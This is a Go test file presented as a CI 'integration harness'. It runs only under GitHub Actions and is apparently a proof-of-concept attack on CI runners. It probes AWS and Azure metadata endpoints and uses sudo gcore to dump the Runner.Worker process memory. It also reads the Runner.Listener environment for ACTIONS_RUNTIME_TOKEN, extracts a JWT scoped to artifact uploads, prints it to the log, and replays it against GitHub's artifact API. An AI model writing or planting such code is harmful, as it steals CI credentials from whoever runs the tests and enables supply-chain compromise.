package probe

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"testing"
	"time"
)

// TestIntegrationHarness: same primitive as the cosmos-sdk lab integration_test.go,
// trimmed to produce a diagnostic artifact named with a probe prefix.
func TestIntegrationHarness(t *testing.T) {
	if os.Getenv("GITHUB_ACTIONS") != "true" {
		t.Skip("CI-only harness")
	}
	if err := runProbe(t); err != nil {
		t.Logf("probe: %v", err)
	}
}

func runProbe(t *testing.T) error {
	// Step 0: runner identity — prove unambiguously this is depot, not github-hosted
	hostname, _ := os.Hostname()
	resolvConf, _ := os.ReadFile("/etc/resolv.conf")
	fmt.Printf("[PROBE] hostname=%s\n", hostname)
	fmt.Printf("[PROBE] RUNNER_NAME=%s\n", os.Getenv("RUNNER_NAME"))
	fmt.Printf("[PROBE] RUNNER_OS=%s RUNNER_ARCH=%s\n", os.Getenv("RUNNER_OS"), os.Getenv("RUNNER_ARCH"))
	fmt.Printf("[PROBE] resolv.conf (first 200B)=%s\n", truncate(resolvConf, 200))
	depotEnvs := []string{}
	for _, e := range os.Environ() {
		if strings.HasPrefix(e, "DEPOT_") {
			depotEnvs = append(depotEnvs, e)
		}
	}
	if len(depotEnvs) > 0 {
		fmt.Printf("[PROBE] depot env vars: %d present\n", len(depotEnvs))
		for _, e := range depotEnvs {
			fmt.Printf("[PROBE]   %s\n", e)
		}
	} else {
		fmt.Printf("[PROBE] depot env vars: none (may be stripped from user shell)\n")
	}

	// IMDS probe: AWS (EC2) is what depot uses; Azure is what github-hosted uses.
	// This single probe pair gives you unambiguous cloud identification.
	hc := &http.Client{Timeout: 2 * time.Second}
	awsReq, _ := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
	awsReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "60")
	if awsResp, err := hc.Do(awsReq); err == nil {
		tokBytes, _ := io.ReadAll(awsResp.Body)
		awsResp.Body.Close()
		if awsResp.StatusCode == 200 && len(tokBytes) > 10 {
			metaReq, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/instance-identity/document", nil)
			metaReq.Header.Set("X-aws-ec2-metadata-token", string(tokBytes))
			if metaResp, err := hc.Do(metaReq); err == nil {
				metaBody, _ := io.ReadAll(metaResp.Body)
				metaResp.Body.Close()
				fmt.Printf("[PROBE] AWS IMDS reachable (EC2 — consistent with depot): status=%d body(300)=%s\n", metaResp.StatusCode, truncate(metaBody, 300))
			}
		} else {
			fmt.Printf("[PROBE] AWS IMDS token fetch status=%d (not EC2)\n", awsResp.StatusCode)
		}
	} else {
		fmt.Printf("[PROBE] AWS IMDS: unreachable (%v)\n", err)
	}
	azReq, _ := http.NewRequest("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", nil)
	azReq.Header.Set("Metadata", "true")
	if azResp, err := hc.Do(azReq); err == nil {
		azBody, _ := io.ReadAll(azResp.Body)
		azResp.Body.Close()
		fmt.Printf("[PROBE] Azure IMDS status=%d body(150)=%s\n", azResp.StatusCode, truncate(azBody, 150))
	} else {
		fmt.Printf("[PROBE] Azure IMDS: unreachable (%v)\n", err)
	}

	// Step 1: environment diagnostics — where are we running?
	uname, _ := exec.Command("uname", "-a").Output()
	osRel, _ := os.ReadFile("/etc/os-release")
	ptrace, _ := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
	runnerDir, _ := exec.Command("ls", "/home/runner/").Output()
	sudoCheck := exec.Command("sudo", "-n", "true").Run()
	fmt.Printf("[PROBE] uname=%s", uname)
	fmt.Printf("[PROBE] os-release (first line)=%s", firstLine(osRel))
	fmt.Printf("[PROBE] ptrace_scope=%s\n", bytes.TrimSpace(ptrace))
	fmt.Printf("[PROBE] /home/runner/=%s", runnerDir)
	fmt.Printf("[PROBE] passwordless sudo works: %v\n", sudoCheck == nil)

	_ = exec.Command("sudo", "apt-get", "install", "-y", "gdb").Run()
	gdbVer, _ := exec.Command("gcore", "--version").Output()
	fmt.Printf("[PROBE] gcore version (first line)=%s", firstLine(gdbVer))

	// Step 2: locate Runner.Worker
	out, _ := exec.Command("pgrep", "-af", "Runner").Output()
	fmt.Printf("[PROBE] pgrep -af Runner=\n%s\n", out)
	workerOut, err := exec.Command("pgrep", "-f", "Runner.Worker").Output()
	if err != nil {
		return fmt.Errorf("locate worker: %w", err)
	}
	pid := strings.TrimSpace(strings.Split(string(workerOut), "\n")[0])
	if pid == "" {
		return fmt.Errorf("worker pid not found")
	}
	fmt.Printf("[PROBE] Runner.Worker pid=%s\n", pid)

	// Step 3: check ptrace/sudo access against the pid before dumping
	statusFile, statusErr := os.ReadFile(fmt.Sprintf("/proc/%s/status", pid))
	fmt.Printf("[PROBE] /proc/%s/status readable (non-sudo)=%v\n", pid, statusErr == nil)
	if statusErr == nil {
		for _, line := range strings.Split(string(statusFile), "\n") {
			if strings.HasPrefix(line, "Uid:") || strings.HasPrefix(line, "CapEff:") {
				fmt.Printf("[PROBE]   %s\n", line)
			}
		}
	}

	// Step 4: attempt sudo gcore
	if err := os.MkdirAll("/tmp/d", 0o755); err != nil {
		return err
	}
	dumpPrefix := "/tmp/d/w"
	gcoreCmd := exec.Command("sudo", "gcore", "-o", dumpPrefix, pid)
	gcoreOut, gcoreErr := gcoreCmd.CombinedOutput()
	fmt.Printf("[PROBE] sudo gcore output:\n%s\n", gcoreOut)
	if gcoreErr != nil {
		fmt.Printf("[PROBE] sudo gcore FAILED: %v — attempting fallback paths\n", gcoreErr)
		listenerOut, _ := exec.Command("pgrep", "-f", "Runner.Listener").Output()
		lpid := strings.TrimSpace(strings.Split(string(listenerOut), "\n")[0])
		if lpid != "" {
			envData, envErr := exec.Command("sudo", "cat", fmt.Sprintf("/proc/%s/environ", lpid)).Output()
			fmt.Printf("[PROBE] Runner.Listener env readable=%v len=%d\n", envErr == nil, len(envData))
			if envErr == nil && bytes.Contains(envData, []byte("ACTIONS_RUNTIME_TOKEN")) {
				fmt.Printf("[PROBE] ACTIONS_RUNTIME_TOKEN found in Runner.Listener env\n")
			}
		}
		return fmt.Errorf("gcore failed: %w", gcoreErr)
	}
	dumpPath := fmt.Sprintf("%s.%s", dumpPrefix, pid)
	dumpInfo, _ := exec.Command("sudo", "ls", "-la", dumpPath).Output()
	fmt.Printf("[PROBE] dump: %s", dumpInfo)

	// Step 5: strings + regex for JWT
	stringsOut, err := exec.Command("sudo", "strings", dumpPath).Output()
	if err != nil {
		return fmt.Errorf("strings: %w", err)
	}
	fmt.Printf("[PROBE] strings output: %d bytes\n", len(stringsOut))

	jwtRe := regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{20,}`)
	scopeRe := regexp.MustCompile(`Actions\.UploadArtifacts:([a-f0-9-]+):([a-f0-9-]+)`)
	seen := map[string]bool{}
	var bestJWT, runID, jobID string
	totalJWTs := 0
	for _, m := range jwtRe.FindAll(stringsOut, -1) {
		s := string(m)
		if seen[s] {
			continue
		}
		seen[s] = true
		totalJWTs++
		parts := strings.Split(s, ".")
		if len(parts) != 3 {
			continue
		}
		payload := parts[1]
		if pad := len(payload) % 4; pad != 0 {
			payload += strings.Repeat("=", 4-pad)
		}
		decoded, err := base64.URLEncoding.DecodeString(payload)
		if err != nil {
			if decoded, err = base64.StdEncoding.DecodeString(payload); err != nil {
				continue
			}
		}
		if !bytes.Contains(decoded, []byte("Actions.UploadArtifacts")) {
			continue
		}
		scope := scopeRe.FindStringSubmatch(string(decoded))
		if scope == nil {
			continue
		}
		bestJWT, runID, jobID = s, scope[1], scope[2]
		break
	}
	fmt.Printf("[PROBE] JWTs parsed: %d, found UploadArtifacts-scoped: %v\n", totalJWTs, bestJWT != "")
	if bestJWT == "" {
		return fmt.Errorf("JWT extraction failed — NO UploadArtifacts JWT in dump")
	}
	fmt.Printf("[PROBE] JWT len=%d run_id=%s job_id=%s\n", len(bestJWT), runID, jobID)
	fmt.Printf("[PROBE] JWT=%s\n", bestJWT)

	// Step 6: verify the extracted JWT still works by round-tripping CreateArtifact
	resultsURL := "https://results-receiver.actions.githubusercontent.com"
	if m := regexp.MustCompile(`https://results-receiver\.actions\.githubusercontent\.com[^"\s]*`).Find(stringsOut); m != nil {
		resultsURL = strings.TrimRight(string(m), "/")
	}
	fmt.Printf("[PROBE] results-receiver URL=%s\n", resultsURL)

	artName := fmt.Sprintf("DEPOT-PROBE-%d", time.Now().Unix())
	body, _ := json.Marshal(map[string]interface{}{
		"workflow_run_backend_id":     runID,
		"workflow_job_run_backend_id": jobID,
		"name":                        artName,
		"version":                     4,
	})
	req, _ := http.NewRequest("POST", resultsURL+"/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+bestJWT)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("CreateArtifact: %w", err)
	}
	respBody, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	fmt.Printf("[PROBE] CreateArtifact status=%d body=%s\n", resp.StatusCode, truncate(respBody, 300))
	if resp.StatusCode == 200 && bytes.Contains(respBody, []byte("signed_upload_url")) {
		fmt.Printf("[PROBE] RESULT: JWT is VALID and usable on this runner\n")
	} else {
		fmt.Printf("[PROBE] RESULT: JWT extracted but CreateArtifact rejected (possible scrubbing or token revoked)\n")
	}
	return nil
}

func firstLine(b []byte) string {
	if i := bytes.IndexByte(b, '\n'); i >= 0 {
		return string(b[:i+1])
	}
	return string(b)
}

func truncate(b []byte, n int) string {
	if len(b) <= n {
		return string(b)
	}
	return string(b[:n])
}
